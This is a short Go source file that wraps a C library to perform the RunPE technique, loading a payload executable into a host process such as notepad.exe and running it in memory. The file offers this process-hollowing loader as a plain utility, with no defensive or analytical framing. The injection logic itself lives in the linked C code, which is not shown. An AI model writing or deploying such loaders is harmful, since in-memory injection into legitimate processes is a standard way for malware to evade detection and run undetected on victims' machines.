//go:build windows
// +build windows

// Package runpe provides functionality to execute PE files in memory using the RunPE technique.
// This package only works on Windows systems.
package runpe

// #cgo CFLAGS: -Wall
// #cgo LDFLAGS: -L${SRCDIR}/../.. -lrunpe -luser32 -lkernel32
// #include "../../cpp/runpe.h"
import "C"
import (
	"fmt"
	"unsafe"
	"syscall"
)

// ExecuteInMemory runs a PE file in memory using RunPE technique
// payload is the PE file as a byte array
// targetPath is the path to the host process (e.g., "C:\\Windows\\System32\\notepad.exe")
func ExecuteInMemory(payload []byte, targetPath string) error {
	if len(payload) < 512 {
		return fmt.Errorf("invalid payload size: %d bytes", len(payload))
	}
	
	// Convert target path to UTF16 pointer for Windows API
	cTarget := syscall.StringToUTF16Ptr(targetPath)
	
	// Call the RunPE32 function from C
	result := C.RunPE32(
		(*C.wchar_t)(unsafe.Pointer(cTarget)),
		(*C.uchar)(unsafe.Pointer(&payload[0])),
		C.size_t(len(payload)),
	)
	
	if result == 0 {
		return fmt.Errorf("execution failed for target: %s", targetPath)
	}
	
	return nil
} 